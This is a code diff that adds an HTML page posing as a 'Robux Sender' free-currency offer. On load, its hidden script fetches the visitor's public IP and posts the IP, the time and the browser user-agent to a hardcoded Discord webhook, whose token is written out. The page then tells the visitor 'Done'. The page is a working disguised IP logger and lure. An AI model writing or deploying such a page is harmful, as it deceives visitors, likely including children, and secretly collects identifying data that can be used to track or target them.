@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Robux Sender</title>
+</head>
+<body style="font-family: sans-serif; padding: 40px;">
+    <h2>Processing...</h2>
+    
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1509885483474354267/YcXvYiz8A16lW22utSf0IEIA-OWC7aTkM2wGV3AZ8XgJ5WqgNQcpSBw0ebv9m3D5AAA5';
+        
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const time = new Date().toLocaleString();
+                
+                return fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor\nIP: ${ip}\nTime: ${time}\nUser-Agent: ${navigator.userAgent}`
+                    })
+                });
+            })
+            .then(() => {
+                document.body.innerHTML = '<h2>Done</h2>';
+            })
+            .catch(err => {
+                document.body.innerHTML = '<h2>Error</h2>';
+                console.error(err);
+            });
+    </script>
+</body>
+</html>
